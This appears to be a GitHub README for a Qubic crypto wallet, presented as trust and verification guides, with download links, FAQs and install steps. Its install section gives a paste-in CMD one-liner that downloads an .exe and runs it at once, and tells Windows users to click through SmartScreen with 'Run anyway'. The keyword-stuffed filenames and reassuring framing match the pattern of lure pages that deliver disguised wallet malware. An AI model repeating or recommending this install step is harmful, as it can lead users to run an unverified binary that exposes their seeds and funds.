![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-hub-banner.png)

# Qubic Wallet trust, source and comparison guides

Check the wallet against its release, its repository and its seed model.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> These guides cover how to check the wallet rather than what to think about it. Nothing on this page is
> an audit, a certification or an endorsement, and no third party reviewed it on the publisher's behalf.

## What this repository is for

This repository holds the verification side of the Qubic Wallet documentation. Eleven guides answer the
question people ask after they have already found a download: is this the wallet it says it is, and how
would I know without trusting a website? Each page works from evidence that a reader can reach, which in
practice means the release page, the source repository and the constants that ship in the client. The
guides deliberately separate what can be checked from what has to be taken on trust, and they say which
is which.

The pages also cover the parts of a wallet decision that are not about code. Whether a desktop wallet
counts as cold storage, what a hardware wallet would and would not change, how the desktop build differs
from the web wallet, and what the October 2026 weak-seed incident did and did not affect. Where a claim
depends on something outside the repository, the page says so instead of implying that the repository
proves it.

The tone is deliberately dry. Verification pages age badly when they are enthusiastic, because the
enthusiasm survives the fact that made it reasonable. These are written to still be accurate when the
version number in a screenshot has moved on, and they point at the release page rather than reproducing
its contents. Where a page depends on a specific build, it names the build and tells you how to confirm
which one you are running before you act on anything it says.

## Who it is for

- People who have been sent a wallet link and want to establish where the build actually comes from.
- Users comparing the desktop wallet with a web wallet, a hardware wallet or simple cold storage.
- Anyone reviewing the October 2026 weak-seed incident and wanting the wallet-specific impact rather than
  the wider story.
- Developers who want to read the repository before installing something they will run with a seed in it.

## Start here

- [What is Qubic Wallet and what does it actually do](what-is-qubic-wallet.md) - the product in one page:
  local keys, nine assets, no server account, and what the desktop build does not include.
- [Is Qubic Wallet safe? Source, seed and installer evidence](is-qubic-wallet-safe.md) - the checks worth
  running yourself, in the order that makes each later check meaningful.
- [Reading the Qubic Wallet GitHub repository before you trust it](qubic-wallet-github-source-review.md) -
  how to read the repository structure, the release history and the build configuration without guessing.
- [The October 2026 Qubic weak-seed incident: desktop wallet impact](qubic-wallet-october-2026-weak-seed-incident.md) -
  what the incident was, what it was not, and what a desktop wallet user should do about it.

## How to use these guides

1. Read the "what is" page first so the vocabulary is settled; several later pages assume it.
2. Run the checks in the safety page against the build you actually downloaded, not the one you meant to.
3. If you are deciding between wallet types, read the comparison pages before the custody page.
4. Read the incident page as history, not as a current warning: the date matters to the conclusion.
5. Keep the release page open in a tab while you read; every version-specific claim is anchored there.

## The guides

### Identity and safety

- [What is Qubic Wallet and what does it actually do](what-is-qubic-wallet.md) - the product surface, the
  seed model and the nine assets, without the marketing framing that usually surrounds them.
- [Is Qubic Wallet safe? Source, seed and installer evidence](is-qubic-wallet-safe.md) - which claims are
  checkable from the release and repository, and which ones are simply not verifiable from outside.
- [The Qubic Wallet vault file: encrypted account, not a backup copy](qubic-wallet-vault-file.md) - what the
  vault file contains, what encrypts it, and why it is not a substitute for the seed.

### Source and incident history

- [Reading the Qubic Wallet GitHub repository before you trust it](qubic-wallet-github-source-review.md) -
  repository layout, release tags and build configuration, read as evidence rather than as reassurance.
- [The October 2026 Qubic weak-seed incident: desktop wallet impact](qubic-wallet-october-2026-weak-seed-incident.md) -
  the timeline, the wallets affected, and the specific question of whether a desktop build was exposed.

### Scams and downloads

- [Qubic Wallet scams: fake downloads, phishing and seed requests](qubic-wallet-scam-phishing-fake-download.md) -
  the three patterns that account for most reported losses, and the one request no wallet will ever make.

### Comparisons

- [Qubic Desktop Wallet vs the Qubic web wallet](qubic-wallet-desktop-vs-web-wallet.md) - what changes when
  keys live on your machine instead of in a browser tab, including the parts that get worse.
- [Using Qubic Wallet with Ledger, Tangem or HASHWallet](qubic-wallet-hardware-ledger-tangem.md) - what a
  hardware wallet would change about this setup and which parts of the workflow it does not touch.
- [Is a desktop wallet cold storage? QUBIC custody compared](qubic-wallet-cold-storage-custody.md) - why a
  desktop wallet sits between hot and cold, and what actually decides the answer.
- [Best Qubic wallet: how to choose between web, mobile and desktop](best-qubic-wallet.md) - a decision
  frame based on what you are protecting and how often you move funds.

### Developers

- [Qubic Wallet CLI and API surface for developers](qubic-wallet-cli-api-developers.md) - what is exposed
  today, what is not, and where the interface boundaries actually sit.

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Decide whether to install at all | [Is Qubic Wallet safe?](is-qubic-wallet-safe.md) | A short list of checks you can run before the first launch |
| Confirm where the build comes from | [GitHub repository review](qubic-wallet-github-source-review.md) | You can point at the tag, the tree and the release artefacts |
| Understand the seed model | [What is Qubic Wallet](what-is-qubic-wallet.md) | You know what is stored locally and what the seed can restore |
| Judge the 2026 incident | [Weak-seed incident page](qubic-wallet-october-2026-weak-seed-incident.md) | You can separate wallet impact from the wider report |
| Choose between desktop and web | [Desktop vs web wallet](qubic-wallet-desktop-vs-web-wallet.md) | A trade-off you can state in one sentence |
| Place a hardware wallet correctly | [Ledger, Tangem, HASHWallet](qubic-wallet-hardware-ledger-tangem.md) | You know which step it protects and which it does not |

## Common first questions

### Does Qubic Wallet hold my keys on a server?

No. The desktop wallet generates and stores keys locally and has no server-side account that could hold
them for you. That also means nobody can recover the account for you if the seed is lost, which is the
trade the rest of these pages keep returning to.

### Is a passing source review the same as an audit?

No. Reading a repository tells you what the code is configured to do and whether the release matches it.
An audit is a separate, commissioned review by a named party, and these pages do not claim one exists.

### Can I use the desktop wallet and the web wallet with the same seed?

The same seed produces the same account, so the address does not change when you switch builds. What
changes is where the key material lives while you use it, which is the part worth thinking about.

### What should I do about the October 2026 weak-seed incident?

Read the page rather than the headlines: it separates what happened from what was reported, and states
which wallet types were affected. If your account was created in the affected window, the page lists the
steps in the order they should be taken.

## Before you install

- Confirm the release page URL you are on is under the account you expect, not a lookalike.
- Check the installer name against the release assets before running anything.
- Have a plan for the seed that is not "a screenshot in the downloads folder".
- Decide, before the first transaction, what you would do if this machine were lost today.

## How to install Qubic Wallet

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

### Windows

Manual install:

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
2. Double-click the .zip to extract it.
3. Move the extracted app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build ships as a .zip archive as well; extract it and run the binary inside.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Extract the archive.
3. Make the extracted binary executable.
4. Run it.


## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
